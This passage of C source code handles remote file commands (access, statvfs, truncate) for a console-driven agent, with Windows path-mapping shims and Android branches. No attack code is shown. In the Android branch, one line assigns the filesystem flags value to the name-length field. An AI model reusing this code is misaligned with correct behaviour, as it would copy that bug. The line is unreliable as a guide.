    if (strcmp(filename, "/") == 0 || strcmp(filename, "/drive") == 0 || strcmp(filename, "/drive/") == 0) {
        if (mode == 2) { // W_OK
            parser_error(p, NULL);
        } else {
            parser_ok(p);
        }
        return;
    }
    char *real = fake_to_real_path(filename);
    if (real != NULL) filename = real;
#endif

    // Test access to the file.
    if (access(filename, mode) < 0) {
        LOG("Access denied to: %s\n", filename);
        parser_error(p, NULL);
    } else {
        LOG("Access granted to: %s\n", filename);
        parser_ok(p);
    }

#ifdef _WIN32
    free_path(real);
#endif
}

void do_file_statvfs(Parser *p)
{
    // Get the pathname (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }
    char *pathname = p->buffer;

#ifdef _WIN32
    if (strcmp(pathname, "/") == 0 || strcmp(pathname, "/drive") == 0 || strcmp(pathname, "/drive/") == 0) {
        parser_error(p, "could not statvfs");
        return;
    }
    char *real = fake_to_real_path(pathname);
    if (real != NULL) pathname = real;
#endif

    // Zero out the structure, since the default value for all fields is 0.
    RESP_FILE_STATVFS vfs;
    memset(&vfs, 0, sizeof(vfs));

#ifdef _WIN32

    // We don't have this call on Windows so we emulate it.
    // Let's stat by hardcoding some values.
    vfs.f_type = htonll(0x5346544e);    // NTFS_SB_MAGIC
    vfs.f_namelen = htonll(MAX_PATH);

    // Get the free disk space statistics and translate the values.
    // Some values are pretty much made up, but what else can we do.
    DWORD dwSectorsPerCluster;
    DWORD dwBytesPerSector;
    DWORD dwNumberOfFreeClusters;
    DWORD dwTotalNumberOfClusters;
    if (GetDiskFreeSpaceA(pathname,
            &dwSectorsPerCluster,
            &dwBytesPerSector,
            &dwNumberOfFreeClusters,
            &dwTotalNumberOfClusters))
    {
        vfs.f_bsize = htonll((uint64_t) dwSectorsPerCluster * (uint64_t) dwBytesPerSector);
        vfs.f_blocks = htonll(dwTotalNumberOfClusters);
        vfs.f_bfree = htonll(dwNumberOfFreeClusters);
        vfs.f_files = htonll(dwTotalNumberOfClusters);  // not really :(
        vfs.f_ffree = htonll(dwNumberOfFreeClusters);   // not really :(
    }

    // Get the volume information and translate the values.
    PathStripToRootA(pathname);
    DWORD dwVolumeSerialNumber;
    DWORD dwMaximumComponentLength;
    DWORD dwFileSystemFlags;
    if (GetVolumeInformationA(
            pathname, NULL, 0, &dwVolumeSerialNumber,
            &dwMaximumComponentLength, &dwFileSystemFlags, NULL, 0))
    {
        memcpy(&vfs.f_fsid, &dwVolumeSerialNumber, sizeof(dwVolumeSerialNumber));
        vfs.f_namelen = htonll(dwMaximumComponentLength);
        if (dwFileSystemFlags & FILE_READ_ONLY_VOLUME) {
            vfs.f_flags = htonll(1);    // ST_RDONLY
        }
    }

#else

    // Do the actual syscall.
    struct statvfs svfs;
    if (statvfs(pathname, &svfs) < 0) {
        LOG("Error on stat call to: %s\n", pathname);
        parser_error(p, "cannot statvfs");
        return;
    }

    // Now translate the results.
    vfs.f_bsize = htonll(svfs.f_bsize);
    vfs.f_blocks = htonll(svfs.f_blocks);
    vfs.f_bfree = htonll(svfs.f_bfree);
    vfs.f_bavail = htonll(svfs.f_bavail);
    vfs.f_files = htonll(svfs.f_files);
    vfs.f_ffree = htonll(svfs.f_ffree);
#ifdef __ANDROID__
    //vfs.f_type = htonll(svfs.f_type); // not present in all versions
#ifdef _STATFS_F_NAMELEN
    vfs.f_namelen = htonll(svfs.f_namelen);
#endif
#ifdef _STATFS_F_FRSIZE
    vfs.f_frsize = htonll(svfs.f_frsize);
#endif
#ifdef _STATFS_F_FLAGS
    vfs.f_namelen = htonll(svfs.f_flags);
    #endif
#endif
    memcpy(&vfs.f_fsid, &svfs.f_fsid, sizeof(svfs.f_fsid));

#endif

    // Send back this structure to the console.
    LOG("Stat call to: %s\n", pathname);
    parser_begin_response(p, CMD_STATUS_OK, sizeof(vfs));
    parser_send_block(p, (char *) &vfs, sizeof(vfs));

#ifdef _WIN32
    free_path(real);
#endif
}

void do_file_truncate(Parser *p)
{
    char *filename = p->buffer;
    uint64_t offset = 0;

    // First qword is the offset in network byte order.
    if (
        (p->header.cmd_len < sizeof(offset) + 2) ||
        (parser_recv_block(p, (char *) &offset, sizeof(offset)) < 0)
    ) {
        LOG("Malformed command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    p->header.cmd_len = p->header.cmd_len - (sizeof(offset));

    // The following bytes are the filename.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

#ifdef _WIN32
    if (strcmp(filename, "/") == 0 || strcmp(filename, "/drive") == 0 || strcmp(filename, "/drive/") == 0) {
        parser_error(p, "could not truncate");
        return;
    }
    char *real = fake_to_real_path(filename);
    if (real != NULL) filename = real;
#endif

    // Truncate the file.
    if (truncate(filename, offset) < 0) {
        LOG("Error truncating file: %s\n", filename);
        parser_error(p, "could not truncate");
    } else {
        LOG("Truncated file %s\n", filename);
        parser_ok(p);
    }

#ifdef _WIN32
    free_path(real);
#endif
}
